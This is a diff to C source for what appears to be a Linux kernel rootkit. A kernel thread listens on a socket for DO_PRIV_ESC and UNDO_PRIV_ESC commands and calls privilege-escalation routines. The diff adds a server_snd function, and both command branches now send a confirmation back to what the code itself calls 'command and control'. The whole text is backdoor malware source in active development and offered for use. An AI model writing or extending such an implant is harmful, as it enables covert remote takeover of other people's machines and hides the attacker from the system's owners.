@@ -4,15 +4,32 @@
 
 struct kthread_t *kthread = NULL;
 
-int server_do(const char *command, struct sockaddr_in *addr)
+void server_do(const char *command, struct sockaddr_in *addr)
 {
+  int size;
+  
   if (!strncmp(command, DO_PRIV_ESC, strlen(DO_PRIV_ESC))) {
     debug_print("Executing command \"%s\"", DO_PRIV_ESC);
+
     do_priv_esc();
+
+    /* notify command and control */
+    size = server_snd(kthread->sock, &kthread->addr, RESP_PRIV_DO, strlen(RESP_PRIV_DO));
+
+    if (size < 0)
+      debug_print("Unable to send response to command and control");
   }
+  
   if (!strncmp(command, UNDO_PRIV_ESC, strlen(UNDO_PRIV_ESC))) {
     debug_print("Executing command \"%s\"", UNDO_PRIV_ESC);
+
     undo_priv_esc();
+
+    /* notify command and control */
+    size = server_snd(kthread->sock, &kthread->addr, RESP_PRIV_UNDO, strlen(RESP_PRIV_UNDO));
+
+    if (size < 0)
+      debug_print("Unable to send response to command and control");
   }
 }
 
@@ -39,6 +56,33 @@ int server_rcv(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf
   iov_iter_init(&msghdr.msg_iter, READ, &iov, 1, len);
 
   size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);
+
+  return size;
+}
+
+int server_snd(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len)
+{
+  struct msghdr msghdr;
+  struct iovec iov;
+  int size = 0;
+
+  /* internal networking protocol agnostic socket representation */
+  if (sock->sk == NULL)
+    return 0;
+
+  iov.iov_base = buf;
+  iov.iov_len = len;
+
+  msghdr.msg_name = addr;                           /* ptr to socket address structure */
+  msghdr.msg_namelen = sizeof(struct sockaddr_in);  /* size of socket address structure */
+  msghdr.msg_iter.iov = &iov;                       /* data */
+  msghdr.msg_control = NULL;
+  msghdr.msg_controllen = 0;
+  msghdr.msg_flags = 0;
+
+  iov_iter_init(&msghdr.msg_iter, WRITE, &iov, 1, len);
+
+  size = sock_sendmsg(sock, &msghdr);
 
   return size;
 }
